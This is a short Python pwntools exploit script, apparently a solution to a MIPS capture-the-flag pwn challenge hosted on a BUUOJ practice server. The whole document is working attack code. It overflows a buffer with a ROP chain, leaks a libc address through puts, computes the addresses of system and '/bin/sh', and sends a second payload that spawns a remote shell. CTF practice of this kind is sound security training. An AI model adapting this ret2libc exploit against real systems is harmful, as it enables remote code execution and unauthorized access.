from pwn import *
context.log_level='debug'
context.arch='mips'

# io=process(['qemu-mipsel-static','-L','/home/keer/mipsel','-g','1234','./pwn2'])
io=remote('node3.buuoj.cn',29799)

def make_call(call_addr,s0,s1,s2,s3):
	pay=p32(0x4006C8)
	pay+='a'*0x1c
	pay+=p32(s0)
	pay+=p32(s1)
	pay+=p32(s2)
	pay+=p32(s3)
	pay+=p32(call_addr)
	return pay

libc=ELF('./libc.so.0')
io.recv()
io.send('a'*0x14)
io.recv()
pay='a'*0x24+make_call(0x004007A8,1,0x0410B58,0x0040092C,0)
pay+='a'*0x20
pay+=p32(0x004007C4)
io.send(pay)
libc_base=u32(io.recv(4))-libc.sym['puts']
libc.address=libc_base
bin_sh_addr=libc.search('/bin/sh\x00').next()
system_addr=libc.sym['system']
pay='a'*0x24+make_call(0x004007A8,1,bin_sh_addr,system_addr,0)
io.send(pay)



success('libc_base:'+hex(libc_base))
io.interactive()